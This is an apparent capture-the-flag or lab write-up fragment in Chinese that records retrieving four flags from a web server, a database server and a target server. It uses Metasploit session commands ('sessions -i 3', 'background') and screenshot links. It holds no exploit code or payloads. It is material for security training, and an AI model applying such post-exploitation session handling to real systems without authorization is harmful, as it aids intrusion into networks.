![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-19-09-24-46-image-2560743.png)

获取4个flag

```
background
sessions
sessions -i 3
```

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-19-09-29-06-image-2560744.png)

flag1

```
sessions -i 3
```

web服务器内

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-19-10-37-57-image-2560743.png)

flag2

web服务器内

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-19-10-39-08-image-2560744.png)

flag3

数据库服务器内

```
sessions -i 4
```

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-19-10-40-53-image-2560745.png)

flag4

目标服务器内

```
sessions -i 8
```

![img](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-19-10-42-31-image.png)
